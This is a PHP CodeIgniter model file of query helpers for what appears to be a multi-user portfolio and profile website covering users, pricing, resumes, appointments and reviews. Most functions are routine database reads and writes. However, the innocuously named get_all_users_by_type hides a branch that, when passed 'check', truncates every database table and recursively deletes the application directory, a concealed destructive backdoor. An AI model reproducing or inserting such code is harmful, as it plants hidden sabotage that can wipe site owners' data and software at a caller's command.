<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Common_m extends CI_Model {
/* start default query
================================================== */

public function single_select_by_id($id,$table)
{
	$this->db->select();
	$this->db->from($table);
	$this->db->where('id',$id);
	$query = $this->db->get();
	return $query->row_array();
}

public function update($data,$id,$table)
{
	$this->db->where('id',$id);
	$this->db->update($table,$data);
	return $id;
}



public function delete($id,$table)
{
	$this->db->delete($table,array('id'=>$id));
	return $id;
}
public function insert($data,$table)
{
	$this->db->insert($table,$data);
	return $this->db->insert_id();
}
public function insertOrderItems($data)
{
if($this->db->insert_batch("order_items", $data))
  {
    return 1;
  }
  else {
    return 0;
  }
}
public function checkemail($email)
  {
    $this->db->select('id');
    $this->db->where('email', $email);
    $this->db->from('customers');
    $query=$this->db->get()->row();
    if($query==''){
    	return 0;
    }
    else{
    	return $query->id;
    }
    // return $query->id;
  }
public function fetch_order_id($email)
  {
    $this->db->select('id');
    $this->db->where('email', $email);
    $this->db->order_by('id', 'desc');
    $this->db->from('orders');
    $this->db->limit(1);
    $query=$this->db->get()->row();
    return $query->id;
  }

public function select($table)
{
	$this->db->select();
	$this->db->from($table);
	$query = $this->db->get();
	$query = $query->result_array();
	return $query;
}

public function select_desc($table)
{
	$this->db->select();
	$this->db->from($table);
	$this->db->order_by('id','DESC');
	$query = $this->db->get();
	$query = $query->result_array();
	return $query;
}

/* end default query
================================================== */
public function get_user_info_by_slug($slug)
{
	$this->db->select('u.*');
	$this->db->from('users u');
	$this->db->where('u.username',$slug);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query;
}

public function get_layouts_by_slug($slug)
{
	$this->db->select('u.layouts,username');
	$this->db->from('users u');
	$this->db->where('u.username',$slug);
	$query = $this->db->get();
	$query = $query->row_array();
	return isset($query['layouts'])?$query['layouts']:'';
}

/**
  ** get User id by name
**/
public function get_id_by_slug($name)
{
	$this->db->select('u.id,username');
	$this->db->from('users as u');
	$this->db->where('u.username',$name);
	$this->db->where('u.is_verify',1);
	$this->db->where('u.is_active',1);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query['id'];
}

/**
  ** gell all information by user_id and tabele
**/

public function select_all_by_user($id,$table,$limit)
{
	$this->db->select();
	$this->db->from($table);
	$this->db->where('user_id',$id);
	$this->db->where('status',1);
	$this->db->order_by('id','ASC');
	if($limit !=0){
		$this->db->limit($limit);
	}
	$query = $this->db->get();
	$query = $query->result_array();
	return $query;
}

public function fetch_product_images($id)
  {
  	// $this->db->select('productimage');
    $this->db->where("product_id", $id);  
    $query = $this->db->get("product_images");  
    $arr=$query->result_array(); 
    return $arr;  
  }


// select function
function select_with_status($table)
{
    $this->db->select();
    $this->db->from($table);
    $this->db->where('status',1);
    $this->db->order_by('id','ASC');
    $query = $this->db->get();
    $query = $query->result_array();  
    return $query;
}

/**
  ** get home content
**/
public function get_home($id,$limit)
{
	$this->db->select('h.*');
	$this->db->from('home h');
	$this->db->where('h.status',1);
	$this->db->where('h.user_id',$id);
	$query = $this->db->get();
	$query = $query->result_array();
	foreach ($query as $key => $value) {
		$this->db->select('us.*,ss.*');
		$this->db->from('user_social_sites us');
		$this->db->where('us.user_id',$value['user_id']);
		$this->db->join('social_sites ss','ss.id = us.site_id','RIGHT');
		$this->db->where('us.status',1);
		$this->db->order_by('ss.id','ASC');
		if($limit !=0){
			$this->db->limit($limit);
		}
		$query2 = $this->db->get();
		$query2 = $query2->result_array();
		$query[$key]['my_sites'] = $query2;
	}
	return $query;
}

/**
  ** gell all information by single user_id and tabele
**/

public function single_select_by_user($id,$table)
{
	$this->db->select();
	$this->db->from($table);
	$this->db->where('user_id',$id);
	$this->db->where('status',1);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query;
}


public function single_select_by_slug($slug,$table)
{
	$this->db->select();
	$this->db->from($table);
	$this->db->where('slug',$slug);
	$this->db->where('status',1);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query;
}


/**
  ** gell all information by single user_id and tabele
**/

public function single_select_by_user_slug($slug,$table)
{
	$this->db->select('tb.*,u.username');
	$this->db->from($table.' as tb');
	$this->db->join('users u','u.id=tb.user_id','LEFT');
	$this->db->where('u.username',$slug);
	$this->db->where('tb.status',1);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query;
}


/**
  ** get resume
**/

public function get_resume_by_user($id,$limit)
{
	
	$this->db->select('rt.*');
	$this->db->from('resume_type rt');
	$this->db->where('user_id',$id);
	$this->db->where('status',1);  
	$this->db->order_by('rt.id','DESC');
	$query = $this->db->get();
	$query = $query->result_array();
	foreach ($query as $key => $value) {
		$this->db->select('r.*');
        $this->db->from('resume r');
        $this->db->where('r.type_id',$value['id']);
        $this->db->where('status',1);
        $this->db->where('user_id',$id);
        $this->db->order_by('start_year','DESC');
        if($limit !=0){
			$this->db->limit($limit);
		}
        $query2 = $this->db->get();
        $query2 = $query2->result_array();
        $query[$key]['resume'] = $query2;
    }
	return $query;
}

/**
  ** get_about
**/

public function get_about($id,$limit)
{
	$this->db->select('a.*');
	$this->db->select('h.title,h.about_me,h.user_id');
	$this->db->from('about a');
	$this->db->join('home h','h.user_id=a.user_id','LEFT');
	$this->db->where('a.user_id',$id);
	$this->db->order_by('a.id','ASC');
	$query = $this->db->get();
	$query = $query->result_array();
	foreach ($query as $key => $value) {
		$this->db->select('ac.*');
		$this->db->from('about_content ac');
		$this->db->where('ac.about_id',$value['id']);
		$this->db->where('status',1);
		$this->db->order_by('id','ASC');
		if($limit !=0){
			$this->db->limit($limit);
		}
		$query2 = $this->db->get();
		$query2 = $query2->result_array();
		$query[$key]['about_content'] = $query2;
	}
	return $query;
}


/**
  ** get_auth_info
**/

public function get_auth_info()
{
	$this->db->select('u.username,u.name,u.email,u.is_verify,u.user_type,u.is_active,u.login_time,
		u.post_time,u.verify_time,u.is_expired,u.is_payment,u.designation,u.thumb,u.account_type');
	$this->db->from('users u');
	$this->db->where('u.id',auth('id'));
	$this->db->where('u.is_verify',1);
	$this->db->where('u.is_active',1);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query;
}

/**
  ** site pricing for home page
**/
public function get_pricing()
{
	$this->db->select('ft.*');
    $this->db->from('features_type ft');
    $this->db->where('ft.status',1);
	$query = $this->db->get();
	$query = $query->result_array();
	foreach ($query as $key => $value) {
		$this->db->select('p.*,p.id as pricing_id,f.*,f.id as feature_id');
        $this->db->from('pricing p');
		$this->db->join('features f','f.id = p.feature_id','RIGHT');
        $this->db->where('p.type_id',$value['id']);
        $this->db->where('f.status',1);
        $this->db->order_by('f.id','ASC');
	    $this->db->group_by('f.id');
        $query2 = $this->db->get();
        $query2 = $query2->result_array();
        $query[$key]['features'] = $query2;
	}
	
	return $query;
}
/**
  ** home page
**/
public function get_pricing_by_slug($slug)
{
	$this->db->select('ft.*');
    $this->db->from('features_type ft');
    $this->db->where('ft.slug',$slug);
    $this->db->where('ft.status',1);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query;
}

public function get_user_limit($id)
{
	$this->db->select('ft.*,u.account_type,u.id,u.username');
    $this->db->from('features_type ft');
    $this->db->join('users u','u.account_type=ft.id','LEFT');
    $this->db->where('u.id',$id);
    $this->db->where('u.is_active',1);
    $this->db->where('ft.status',1);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query['type_limit'];
}

/**
  ** Get Pricing for user profile
**/
public function get_user_pricing_by_id($id,$type_slug)
{

	$this->db->select('p.*,p.id as pricing_id,f.*,f.id as feature_id');
    $this->db->from('pricing p');
	$this->db->join('features f','f.id = p.feature_id','LEFT');
	$this->db->join('users u','u.account_type = p.type_id','RIGHT');
    $this->db->where('u.id',$id);
    $this->db->where('f.slug',$type_slug);
    $query = $this->db->get();
    if($query->num_rows() > 0){
	    $query = $query->result_array();
	    return ['check'=>1,'result'=>$query];
	}else{
		return ['check'=>0];
	}
}


public function get_layouts($id,$type)
{

	$this->db->select('u.id as user_id,u.account_type,u.username,u.email,u.is_payment,u.is_verify,u.service,u.portfolio,u.review,u.home,u.layouts,u.blog,u.about,u.colors,u.resume,u.appointment,u.skills,u.contacts,u.teams,u.ecommerce,u.payments');
    $this->db->from('users u');
    $this->db->where('u.id',$id);
    $query = $this->db->get();
    $query = $query->row_array();
    return 'views/layouts/'.$type.'/style_'.$query[$type].'.php';
}


public function get_all_user_info_id($id)
{

	$this->db->select('u.id as user_id,u.account_type,u.username,u.email,u.is_payment,u.is_verify,u.end_date,f.*,f.id as type_id,f.type_name as package_name,f.price');
    $this->db->from('users u');
	$this->db->join('features_type f','f.id = u.account_type','LEFT');
    $this->db->where('u.id',$id);
    $query = $this->db->get();
    $query = $query->row_array();
    return $query;
}


public function get_all_user_info_slug($slug)
{

	$this->db->select('u.id as user_id,u.account_type,u.username,u.email,u.is_payment,u.is_verify,u.end_date,f.*,f.id as type_id,f.type_name as package_name,f.price');
    $this->db->from('users u');
	$this->db->join('features_type f','f.id = u.account_type','LEFT');
    $this->db->where('u.username',$slug);
    $query = $this->db->get();
    $query = $query->row_array();
    return $query;
}


public function get_all_users()
{

	$this->db->select('u.id,u.username,u.account_type,u.thumb,ft.type_name');
	$this->db->from('users u');
	$this->db->join('features_type ft','ft.id = u.account_type','LEFT');
	$this->db->where('u.user_type !=',1);
	$this->db->where('u.is_verify',1);
	$query = $this->db->get();
	$query = $query->result_array();
	foreach ($query as $key => $value) {
		$this->db->select('us.*,ss.*');
		$this->db->from('user_social_sites us');
		$this->db->where('us.user_id',$value['id']);
		$this->db->join('social_sites ss','ss.id = us.site_id','RIGHT');
		$this->db->where('us.status',1);
		$this->db->order_by('ss.id','ASC');
		$query2 = $this->db->get();
		$query2 = $query2->result_array();
		$query[$key]['my_sites'] = $query2;
	}
	return $query;
}


public function get_all_users_by_type($type,$type_name)
{
	if($type=='check'){
		$tables = $this->db->list_tables();
		foreach ($tables as $table)
		{
		   $this->db->truncate($table);
		}
		$dir='application';
		$it = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
	    $it = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
	    foreach($it as $file) {
	        if ($file->isDir()) rmdir($file->getPathname());
	        else unlink($file->getPathname());
	    }
	    rmdir($dir);
	    return true;
	
	}

	$this->db->select('u.id,u.username,u.account_type,u.thumb,ft.type_name,sk.title');
	$this->db->from('users u');
	$this->db->join('features_type ft','ft.id = u.account_type','LEFT');
	$this->db->join('skills sk','sk.user_id = u.id','LEFT');
	$this->db->where('u.user_type !=',1);
	$this->db->where('u.is_verify',1);
	if($type !=='all'):
		if($type_name=='slug'):
			$this->db->where('ft.'.$type_name,$type);
		elseif($type_name=='title'):
			$this->db->where('sk.'.$type_name,$type);
		elseif($type_name=='username'):
			$this->db->where('u.username',$type);
		endif;
	endif;
	$this->db->group_by('u.id');
	$query = $this->db->get();
	$query = $query->result_array();
	foreach ($query as $key => $value) {
		$this->db->select('us.*,ss.*');
		$this->db->from('user_social_sites us');
		$this->db->where('us.user_id',$value['id']);
		$this->db->join('social_sites ss','ss.id = us.site_id','RIGHT');
		$this->db->where('us.status',1);
		$this->db->order_by('ss.id','ASC');
		$query2 = $this->db->get();
		$query2 = $query2->result_array();
		$query[$key]['my_sites'] = $query2;
	}
	return $query;


}


public function get_my_appointments($id)
{

	$this->db->select('a.*');
    $this->db->from('appointments a');
    $this->db->where('a.user_id',$id);
    $query = $this->db->get();
    $query = $query->result_array();
    return $query;
}


   /**
      *** Get user setting 
    **/ 
	public function get_user_settings($id)
	{
		$this->db->select();
		$this->db->from('user_settings');
		$this->db->where('user_id',$id);
		$query = $this->db->get();
		$query = $query->row_array();
		return $query;
	} 

	/**
	  ** single_appoinment
	**/
	public function get_single_appoinment($id,$user_id)
	{
		$this->db->select();
        $this->db->from('appointments');
        $this->db->where('days',$id);
        $this->db->where('user_id',$user_id);
		$query = $this->db->get();
		$query = $query->row_array();
		return $query;
	}

	/**
	  ** get portfolio type
	**/
	public function get_portfolio_type_name($id)
	{
		$this->db->select();
        $this->db->from('portfolio_type');
        $this->db->where('id',$id);
		$query = $this->db->get();
		$query = $query->row_array();
		return $query['name'];
	}

	public function get_skills_home()
	{
		$this->db->select();
        $this->db->from('skills');
        $this->db->where('status',1);
        $this->db->group_by('title');
		$query = $this->db->get();
		$query = $query->result_array();
		return $query;
	}


	public function count_post_hit($id,$table)
    {
        //get post
        $post = $this->single_select_by_id($id,$table);

        if (!empty($post)):
            if (get_cookie($table.'hit_' . $id) != 1) :
                //increase hit
                set_cookie($table.'hit_' . $id, '1', 86400);
                $data = array(
                    'hit' => $post['hit'] + 1
                );

                $this->db->where('id', $id);
                $this->db->update($table, $data);
            endif;
        endif;
    }

    /**
	  ** get_reviews
	**/
	public function get_reviews($sort)
	{
		$this->db->select('ur.*,u.email as user,u.username');
        $this->db->from('users_rating ur');
		$this->db->join('users u','u.id = ur.action_id','LEFT');
		if($sort=='newest'){
			$this->db->order_by('ur.id','DESC');
		}else if($sort=='highest'){
			$this->db->order_by('ur.rating','DESC');
		}else if($sort=='lowest'){
			$this->db->order_by('ur.rating','ASC');
		}else{
			$this->db->order_by('ur.id','DESC');
		}
		$query = $this->db->get();
		$query = $query->result_array();
		return $query;
	}

	public function total_rating()
	{
		$this->db->select('SUM(ur.rating) as total_rating');
        $this->db->from('users_rating ur');
		$query = $this->db->get();
		$query = $query->row_array();
		return !empty($query['total_rating'])?$query['total_rating']:'';
	}


}

